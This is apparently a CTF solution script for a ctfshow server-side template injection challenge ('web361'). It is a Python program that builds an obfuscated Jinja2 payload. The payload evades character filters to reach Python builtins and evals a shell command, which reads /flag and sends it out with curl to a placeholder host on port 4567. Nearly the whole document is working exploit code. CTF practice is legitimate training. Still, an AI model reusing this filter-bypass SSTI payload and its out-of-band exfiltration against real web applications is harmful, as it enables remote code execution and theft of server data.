# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/ctfshow-SSTI.md
# TITLE: web361
# CATEGORY: web

import requests
cmd='__import__("os").popen("curl http://xxx:4567?p=`cat /flag`").read()'
def fun1(s):
	t=[]
	for i in range(len(s)):
		t.append(ord(s[i]))
	k=''
	t=list(set(t))
	for i in t:
		k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\n'
	return k
def fun2(s):
	t=[]
	for i in range(len(s)):
		t.append(ord(s[i]))
	t=list(set(t))
	k=''
	for i in range(len(s)):
		if i<len(s)-1:
			k+='chr('+'e'*(t.index(ord(s[i]))+1)+')%2b'
		else:
			k+='chr('+'e'*(t.index(ord(s[i]))+1)+')'
	return k
url ='http://68f8cbd4-f452-4d69-b382-81eafed22f3f.chall.ctf.show/?name='+fun1(cmd)+'''
{% set coun=dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd='''+fun2(cmd)+'''
%}
{%if x.eval(cmd)%}
abc
{%endif%}
'''
print(url)
